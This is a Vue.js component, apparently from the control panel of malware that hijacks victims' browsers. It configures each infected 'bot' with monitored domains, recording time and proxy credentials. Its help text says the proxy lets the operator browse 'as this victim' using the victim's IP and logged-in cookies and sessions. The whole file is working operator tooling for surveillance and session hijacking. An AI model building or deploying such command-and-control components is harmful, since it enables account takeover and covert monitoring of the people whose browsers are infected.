<template>
  <div>
    <b-input-group prepend="Bot Name" class="mt-3">
      <b-form-input v-model="name" autofocus></b-form-input>
    </b-input-group>

    <b-input-group prepend="Bot Switch" class="mt-3">
      <b-form-checkbox
        v-for="key in Object.keys(switch_config)"
        v-bind:key="key"
        v-model="switch_config[key]"
        >{{ key }}</b-form-checkbox
      >
    </b-input-group>


    <b-input-group prepend="Bot Monitor Domains" class="mt-3">
      <b-form-textarea
        id="textarea"
        v-model="data_config.MONITOR_DOMAINS"
        placeholder=""
        rows="3"
        max-rows="6"
      ></b-form-textarea>
    </b-input-group>

    <div class="mt-4 p-3 border rounded border-secondary">
      <h5><font-awesome-icon :icon="['fas', 'key']" /> Proxy Connection Access</h5>
      <p class="text-muted small">
        To browse <b>as this victim</b> (using their IP and logged-in Sessions/Cookies), configure your proxy client to connect to <code>SERVER_IP:8080</code> using these credentials.
      </p>
      
      <b-input-group prepend="Username" class="mb-2">
        <b-form-input v-model="proxy_username" placeholder="Enter username"></b-form-input>
      </b-input-group>

      <b-input-group prepend="Password">
        <b-form-input v-model="proxy_password" placeholder="Enter password"></b-form-input>
      </b-input-group>
    </div>


    <hr />

    <b-button variant="primary" v-on:click="update_bot_config">
      <font-awesome-icon :icon="['fas', 'edit']" class="icon alt mr-1 ml-1" />
      Update
    </b-button>

   
  </div>
</template>

<script>
import { api_request, get_field } from "./utils.js";
export default {
  name: "DataConfig",
  props: {
    id: {
      type: String,
      required: true,
    },
    name: {
      type: String,
      required: true,
    },
    refresh: {
      type: Function,
      required: true,
    },
  },
  data() {
    return {
      switch_config: {},
      data_config: {
        RECORDING_SECONDS: 0,
        MONITOR_DOMAINS: "",
      },
      globalProxyId: null,
      proxy_username: "",
      proxy_password: "",
    };
  },
  computed: {
    isGlobalProxy() {
      return this.globalProxyId === this.id;
    },
  },
  mounted() {
    this.fetchData();
  },
  methods: {
    fetchData() {
      get_field(this.id, "switch_config").then((response) => {
        this.switch_config = response;
      });

      get_field(this.id, "data_config").then((response) => {
        this.data_config = response;
        this.data_config.MONITOR_DOMAINS = this.data_config.MONITOR_DOMAINS ? this.data_config.MONITOR_DOMAINS.join(",") : "";
      });

      get_field(this.id, "proxy_username").then(res => this.proxy_username = res);
      get_field(this.id, "proxy_password").then(res => this.proxy_password = res);
    },
    async update_bot_config() {
      await api_request(
        "PUT",
        "/bots",
        {},
        {
          bot_id: this.id,
          name: this.name,
          switch_config: this.switch_config,
          data_config: {
            ...this.data_config,
            RECORDING_SECONDS: parseInt(this.data_config.RECORDING_SECONDS),
            MONITOR_DOMAINS: this.data_config.MONITOR_DOMAINS.split(","),
          },
          proxy_username: this.proxy_username,
          proxy_password: this.proxy_password,
        }
      );
      this.$toastr.s("Bot renamed successfully.");
      this.refresh();
    },
  },
};
</script>

<style scoped>
/* Add component-specific styles here */
</style>
